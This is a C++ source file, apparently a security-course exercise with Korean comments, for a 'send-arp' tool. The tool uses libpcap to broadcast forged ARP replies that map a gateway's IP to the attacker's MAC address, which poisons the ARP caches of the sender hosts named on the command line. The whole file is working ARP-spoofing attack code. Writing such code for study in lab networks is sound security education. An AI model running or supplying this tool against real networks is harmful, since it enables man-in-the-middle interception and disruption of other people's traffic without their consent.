#include <cstdio>
#include <pcap.h>
#include <cstring>
#include <arpa/inet.h>
#include <net/if.h> // ioctl
#include <sys/ioctl.h> // ioctl
#include <unistd.h>

// MAC class 사용법 모름 그냥 헤더 선언
#pragma pack(push, 1)
struct EthHdr {
    uint8_t dmac_[6];
    uint8_t smac_[6];
    uint16_t type_;
};

struct ArpHdr {
    uint16_t hrd_;
    uint16_t pro_;
    uint8_t hln_;
    uint8_t pln_;
    uint16_t op_;
    uint8_t smac_[6];
    uint32_t sip_;
    uint8_t tmac_[6];
    uint32_t tip_;
};

struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// 사용법
void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 172.168.10.1 172.168.10.2\n");
}

// attacker mac 주소를 알아내기 위한 함수
int getMacAddress(const char* interface, uint8_t* mac) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ); // 필드에 인터페이스 이름을 저장
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) { // ifr_hwaddr.sa_data <- attacker mac
        perror("ioctl");
        close(sockfd);
        return -1;
    }
    close(sockfd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 1;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) { // ./exe interface sender target sender2 target2
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;
    memset(&packet, 0, sizeof(packet));

    uint8_t attackerMac[6];
    getMacAddress(dev, attackerMac);

    memset(packet.eth_.dmac_, 0xFF, 6); // 브로드캐스트
    memcpy(packet.eth_.smac_, attackerMac, 6);
    packet.eth_.type_ = htons(0x0806);  // ARP

    packet.arp_.hrd_ = htons(1);  // Ethernet
    packet.arp_.pro_ = htons(0x0800);  // IPv4
    packet.arp_.hln_ = 6;  // MAC 주소 길이
    packet.arp_.pln_ = 4;  // IP 주소 길이
    packet.arp_.op_ = htons(2);  // ARP Reply ( 1 -> request )

    for (int i = 2; i < argc; i += 2) {
        uint32_t senderIp = inet_addr(argv[i]); // sender
        uint32_t targetIp = inet_addr(argv[i + 1]); // target - gateway

        memcpy(packet.arp_.smac_, attackerMac, 6); // gateway mac -> attacker mac
        packet.arp_.sip_ = targetIp;
        memset(packet.arp_.tmac_, 0x00, 6);
        packet.arp_.tip_ = senderIp;

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);
    return 0;
}